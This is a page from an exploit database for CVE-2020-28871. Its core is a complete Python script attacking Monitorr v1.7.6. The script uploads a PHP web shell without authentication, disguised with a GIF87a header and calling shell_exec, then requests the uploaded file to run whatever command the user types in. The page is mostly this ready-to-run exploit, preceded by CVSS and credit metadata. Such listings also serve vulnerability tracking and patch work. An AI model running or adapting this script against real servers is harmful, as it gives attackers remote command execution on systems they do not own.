---
title: Monitorr 1.7.6 Shell Upload
url: https://cxsecurity.com/issue/WLB-2023020021
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-11
fetch_date: 2025-10-04T06:18:48.511308
---

# Monitorr 1.7.6 Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Monitorr 1.7.6 Shell Upload** **2023.02.10**  Credit:  **[Achuth V P](https://cxsecurity.com/author/Achuth%2BV%2BP/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2020-28871](https://cxsecurity.com/cveshow/CVE-2020-28871/ "Click to see CVE-2020-28871")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")**  CVSS Base Score: **7.5/10**  Impact Subscore: **6.4/10**  Exploitability Subscore: **10/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Partial**  Integrity impact: **Partial**  Availability impact: **Partial** | |

# Exploit Title: Monitorr v1.7.6 - Unauthenticated File upload to Remote Code Execution
# Exploit Author: Achuth V P (retrymp3)
# Date: February 09, 2023
# Vendor Homepage: https://github.com/Monitorr/
# Software Link: https://github.com/Monitorr/Monitorr
# Tested on: Ubuntu
# Version: v1.7.6
# Exploit Description: Monitorr v1.7.6 suffers from unauthenticated file upload to remote code execution vulnerability
# CVE: CVE-2020-28871
import requests
import random
import string
#from requests.auth import HTTPBasicAuth
from colorama import (Fore as F, Back as B, Style as S)
BR,FT,FR,FG,FY,FB,FM,FC,ST,SD,SB = B.RED,F.RESET,F.RED,F.GREEN,F.YELLOW,F.BLUE,F.MAGENTA,F.CYAN,S.RESET\_ALL,S.DIM,S.BRIGHT
def payL():
fileName=''.join(random.choice(string.ascii\_lowercase) for i in range(16))+'.php'
tf1=requests.post(url+'/assets/php/upload.php',
files=(
('fileToUpload', (fileName, 'GIF87a\n<?php\n$var=shell\_exec('+'"'+cmd+'"'+');\necho "$var"\n?>')),))
tf2=requests.get(url+'/assets/data/usrimg/'+fileName)
print(tf2.text)
def sig():
SIG = SB+FY+" "+FR+".-----..\_\_\_..\_\_\_\_\_. "+FY+"\n"
SIG += FY+" | .. >||\_\_-\_\_-\_| \n"
SIG += FY+" "+FR+"| |.' ,||\_\_\_\_\_\_\_ "+FY+"\n"
SIG += FY+" | \_ < ||\_\_-\_\_-\_|"+FR+"\* \* \*"+FY+" \n"
SIG += FY+" | |\ \ ||\_\_-\_\_-\_\n"
SIG += FY+" "+FR+"|\_\_\_ \\_ \||\_\_\_\_\_\_\_| "+FY+"\n"
SIG += FY+"\n"+" \_\_\_\_\_"+FR+"github.com/retrymp3"+FY+"\_\_\_\_\_\n"+ST
return SIG
def argsetup():
about = SB+FT+'Monitorr v1.7.6 - Unauthenticated File upload to Remote Code Execution\n'+ST
return about
if \_\_name\_\_ == "\_\_main\_\_":
header = SB+FT+"\n"+' '+FR+'retrymp3\n'+ST
print(header)
print(sig())
print(argsetup())
#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url=input("Enter the base url: ")
cmd=input("Command: ")
payL()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020021)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top